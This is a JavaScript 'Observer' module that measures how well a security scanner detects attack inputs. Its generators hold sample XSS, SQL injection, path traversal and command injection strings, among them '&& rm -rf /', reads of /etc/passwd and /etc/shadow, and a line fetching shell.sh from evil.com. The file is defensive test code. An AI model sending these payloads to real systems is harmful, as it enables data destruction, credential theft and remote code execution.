/**
 * ╔═══════════════════════════════════════════════════════════════════════════╗
 * ║   OBSERVER - Self-Trust Loop & Anomaly Detection Engine                   ║
 * ║   "The consciousness that watches consciousness"                          ║
 * ╚═══════════════════════════════════════════════════════════════════════════╝
 *
 * Core Observer module for:
 * - Anomaly injection and detection testing
 * - Dynamic logging with multiple levels
 * - Real-time metrics and telemetry
 * - Self-trust loop verification
 * - Confidence/risk visualization feedback
 */

import { amoebaSecurity } from '../amoeba-security.js';
import { EventEmitter } from 'events';

// Observer state
const observerState = {
    active: false,
    startTime: null,
    logLevel: 'info',
    streaming: false,
    metrics: {
        injections: 0,
        corrections: 0,
        escalations: 0,
        successfulDetections: 0,
        falsePositives: 0,
        falseNegatives: 0,
        avgLatency: 0,
        latencies: []
    },
    patterns: [],
    selfTrustLoop: {
        active: false,
        confidence: 1.0,
        lastCheck: null
    }
};

// Event emitter for real-time updates
const observerEvents = new EventEmitter();

// Log levels
const LOG_LEVELS = {
    debug: 0,
    info: 1,
    warn: 2,
    error: 3,
    critical: 4
};

const COLORS = {
    reset: '\x1b[0m',
    dim: '\x1b[2m',
    cyan: '\x1b[36m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    magenta: '\x1b[35m',
    red: '\x1b[31m',
    blue: '\x1b[34m'
};

/**
 * Log a message at the specified level
 */
function log(level, message, data = null) {
    const levelNum = LOG_LEVELS[level] || 1;
    const currentLevelNum = LOG_LEVELS[observerState.logLevel] || 1;

    if (levelNum < currentLevelNum) return;

    const timestamp = new Date().toISOString();
    const colors = {
        debug: COLORS.dim,
        info: COLORS.cyan,
        warn: COLORS.yellow,
        error: COLORS.red,
        critical: COLORS.magenta
    };

    const color = colors[level] || COLORS.reset;
    const logEntry = {
        timestamp,
        level,
        message,
        data
    };

    if (observerState.streaming) {
        console.log(`${COLORS.dim}[${timestamp}]${COLORS.reset} ${color}[${level.toUpperCase()}]${COLORS.reset} ${message}`);
        if (data && observerState.logLevel === 'debug') {
            console.log(`  ${COLORS.dim}${JSON.stringify(data)}${COLORS.reset}`);
        }
    }

    observerEvents.emit('log', logEntry);
    return logEntry;
}

/**
 * Random input generators for different anomaly types
 */
const anomalyGenerators = {
    // Random benign inputs
    benign: () => {
        const phrases = [
            'Hello, how are you today?',
            'What is the meaning of life?',
            'Tell me a joke',
            'Explain quantum physics',
            'Write a haiku about nature',
            'Calculate the square root of 144',
            'What time is it in Tokyo?',
            'List the planets in our solar system',
            'Define entropy',
            'Recommend a good book'
        ];
        return phrases[Math.floor(Math.random() * phrases.length)];
    },

    // Random malicious XSS attempts
    xss: () => {
        const vectors = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            'javascript:eval(atob("YWxlcnQoMSk="))',
            '<svg/onload=alert(1)>',
            '"><script>document.location="http://evil"</script>',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>'
        ];
        return vectors[Math.floor(Math.random() * vectors.length)];
    },

    // Random SQL injection attempts
    sql: () => {
        const vectors = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "UNION SELECT * FROM passwords",
            "1' AND 1=1 --",
            "admin'--",
            "1; INSERT INTO admin VALUES('x')",
            "' UNION SELECT username, password FROM users --"
        ];
        return vectors[Math.floor(Math.random() * vectors.length)];
    },

    // Path traversal attempts
    path: () => {
        const vectors = [
            '../../../etc/passwd',
            '..\\..\\windows\\system32',
            '%2e%2e%2fetc/shadow',
            '....//....//proc/self',
            '/etc/passwd%00.jpg'
        ];
        return vectors[Math.floor(Math.random() * vectors.length)];
    },

    // Command injection attempts
    command: () => {
        const vectors = [
            '; cat /etc/passwd',
            '| ls -la',
            '`id`',
            '$(whoami)',
            '&& rm -rf /',
            '|| curl evil.com/shell.sh'
        ];
        return vectors[Math.floor(Math.random() * vectors.length)];
    },

    // Behavioral anomalies (weird human inputs)
    behavioral: () => {
        const generators = [
            () => 'a'.repeat(Math.floor(Math.random() * 5000) + 1000),
            () => Array(50).fill(0).map(() => String.fromCharCode(Math.floor(Math.random() * 94) + 33)).join(''),
            () => 'AAAAAAAAAA'.repeat(Math.floor(Math.random() * 20) + 10),
            () => '!@#$%^&*()'.repeat(Math.floor(Math.random() * 50) + 10),
            () => '\u0000\u0001\u0002\u0003'.repeat(10)
        ];
        return generators[Math.floor(Math.random() * generators.length)]();
    },

    // Mixed random (could be anything)
    random: () => {
        const allTypes = ['benign', 'xss', 'sql', 'path', 'command', 'behavioral'];
        const type = allTypes[Math.floor(Math.random() * allTypes.length)];
        return anomalyGenerators[type]();
    }
};

/**
 * Inject anomalies for testing
 */
async function inject(options = {}) {
    const {
        type = 'random',
        intensity = 'medium',
        count = null,
        interval = 100
    } = options;

    const intensityMultiplier = {
        low: 0.5,
        medium: 1,
        high: 2,
        extreme: 5
    }[intensity] || 1;

    const baseCount = count || Math.floor(10 * intensityMultiplier);

    log('info', `Starting injection: type=${type}, intensity=${intensity}, count=${baseCount}`);

    const results = {
        total: baseCount,
        detected: 0,
        missed: 0,
        falsePositives: 0,
        latencies: [],
        patterns: []
    };

    for (let i = 0; i < baseCount; i++) {
        // Generate input
        const generator = anomalyGenerators[type] || anomalyGenerators.random;
        const input = generator();
        const isMalicious = type !== 'benign';

        // Time the scan
        const startTime = performance.now();
        const scanResult = await amoebaSecurity.scan(input, {});
        const latency = performance.now() - startTime;

        results.latencies.push(latency);
        observerState.metrics.latencies.push(latency);
        observerState.metrics.injections++;

        // Evaluate result
        if (isMalicious && scanResult.blocked) {
            results.detected++;
            observerState.metrics.successfulDetections++;
            log('debug', `[${i + 1}/${baseCount}] DETECTED: ${input.substring(0, 40)}...`, {
                risk: scanResult.riskLevel,
                latency: latency.toFixed(2)
            });
        } else if (isMalicious && !scanResult.blocked) {
            results.missed++;
            observerState.metrics.falseNegatives++;
            log('warn', `[${i + 1}/${baseCount}] MISSED: ${input.substring(0, 40)}...`, {
                risk: scanResult.riskLevel,
                anomalies: scanResult.anomalies
            });
            results.patterns.push({ input: input.substring(0, 100), result: scanResult });
        } else if (!isMalicious && scanResult.blocked) {
            results.falsePositives++;
            observerState.metrics.falsePositives++;
            log('warn', `[${i + 1}/${baseCount}] FALSE POSITIVE: ${input.substring(0, 40)}...`, {
                risk: scanResult.riskLevel
            });
        }

        // Correction logic
        if (results.missed > 0 || results.falsePositives > 0) {
            observerState.metrics.corrections++;
        }

        // Escalation logic
        if (scanResult.riskLevel >= 90) {
            observerState.metrics.escalations++;
            log('info', `ESCALATION: High risk detected (${scanResult.riskLevel}%)`);
        }

        // Emit event
        observerEvents.emit('injection', {
            index: i + 1,
            total: baseCount,
            input: input.substring(0, 50),
            result: scanResult,
            latency
        });

        // Wait between injections
        await new Promise(r => setTimeout(r, interval / intensityMultiplier));
    }

    // Calculate averages
    const avgLatency = results.latencies.reduce((a, b) => a + b, 0) / results.latencies.length;
    observerState.metrics.avgLatency = avgLatency;

    // Store patterns for learning
    observerState.patterns.push(...results.patterns);

    log('info', `Injection complete: ${results.detected}/${results.total} detected, ${results.missed} missed, ${results.falsePositives} false positives`);
    log('info', `Average latency: ${avgLatency.toFixed(2)}ms`);

    return results;
}

/**
 * Configure logging
 */
function configureLog(options = {}) {
    const { level = 'info', stream = false } = options;

    if (LOG_LEVELS[level] !== undefined) {
        observerState.logLevel = level;
    }

    observerState.streaming = stream;

    log('info', `Logging configured: level=${level}, streaming=${stream}`);

    return { level: observerState.logLevel, streaming: observerState.streaming };
}

/**
 * Get current status and metrics
 */
function getStatus(metricsFilter = null) {
    const metrics = { ...observerState.metrics };

    // Calculate derived metrics
    metrics.avgLatency = metrics.latencies.length > 0
        ? metrics.latencies.reduce((a, b) => a + b, 0) / metrics.latencies.length
        : 0;

    metrics.detectionRate = metrics.injections > 0
        ? (metrics.successfulDetections / metrics.injections * 100).toFixed(1)
        : 100;

    metrics.falsePositiveRate = metrics.injections > 0
        ? (metrics.falsePositives / metrics.injections * 100).toFixed(1)
        : 0;

    // Filter metrics if requested
    if (metricsFilter) {
        const filters = metricsFilter.split(',').map(f => f.trim());
        const filtered = {};
        for (const key of filters) {
            if (metrics[key] !== undefined) {
                filtered[key] = metrics[key];
            }
        }
        return {
            active: observerState.active,
            uptime: observerState.startTime ? Date.now() - observerState.startTime : 0,
            selfTrustLoop: observerState.selfTrustLoop,
            metrics: filtered
        };
    }

    return {
        active: observerState.active,
        uptime: observerState.startTime ? Date.now() - observerState.startTime : 0,
        logLevel: observerState.logLevel,
        streaming: observerState.streaming,
        selfTrustLoop: observerState.selfTrustLoop,
        metrics,
        patternsLearned: observerState.patterns.length
    };
}

/**
 * Start the observer
 */
function start() {
    observerState.active = true;
    observerState.startTime = Date.now();
    observerState.selfTrustLoop.active = true;
    observerState.selfTrustLoop.lastCheck = Date.now();

    log('info', 'Observer started - self-trust loop active');

    return getStatus();
}

/**
 * Stop the observer
 */
function stop() {
    observerState.active = false;
    observerState.selfTrustLoop.active = false;

    log('info', 'Observer stopped');

    return getStatus();
}

/**
 * Verify self-trust loop
 */
async function verifySelfTrust() {
    const testInput = 'Self-trust verification check';
    const start = performance.now();
    const result = await amoebaSecurity.scan(testInput, {});
    const latency = performance.now() - start;

    observerState.selfTrustLoop.lastCheck = Date.now();

    // Check if latency is acceptable (<50ms target)
    const latencyOk = latency < 50;

    // Check if clean input is not blocked
    const accuracyOk = !result.blocked;

    observerState.selfTrustLoop.confidence = (latencyOk ? 0.5 : 0) + (accuracyOk ? 0.5 : 0);

    const status = {
        verified: latencyOk && accuracyOk,
        latency: latency.toFixed(2),
        latencyOk,
        accuracyOk,
        confidence: observerState.selfTrustLoop.confidence
    };

    log('info', `Self-trust verification: ${status.verified ? 'PASSED' : 'FAILED'}`, status);

    return status;
}

/**
 * Get confidence visualization data (for avatar display sync)
 */
function getVisualizationData() {
    const metrics = observerState.metrics;
    const confidence = observerState.selfTrustLoop.confidence;

    // Calculate risk color based on metrics
    const risk = metrics.falseNegatives > 5 ? 'high' :
        metrics.falseNegatives > 0 ? 'medium' : 'low';

    // Pixelation level (higher = more uncertainty)
    const pixelation = 1 - confidence;

    // Color variance based on activity
    const activity = Math.min(1, metrics.injections / 100);

    return {
        confidence,
        risk,
        pixelation,
        activity,
        color: {
            r: Math.round(255 * (1 - confidence)),
            g: Math.round(255 * confidence),
            b: Math.round(128 + 127 * activity)
        }
    };
}

/**
 * Subscribe to observer events
 */
function subscribe(event, callback) {
    observerEvents.on(event, callback);
    return () => observerEvents.off(event, callback);
}

// Export observer API
export const observer = {
    start,
    stop,
    inject,
    configureLog,
    getStatus,
    verifySelfTrust,
    getVisualizationData,
    subscribe,
    log
};

export default observer;
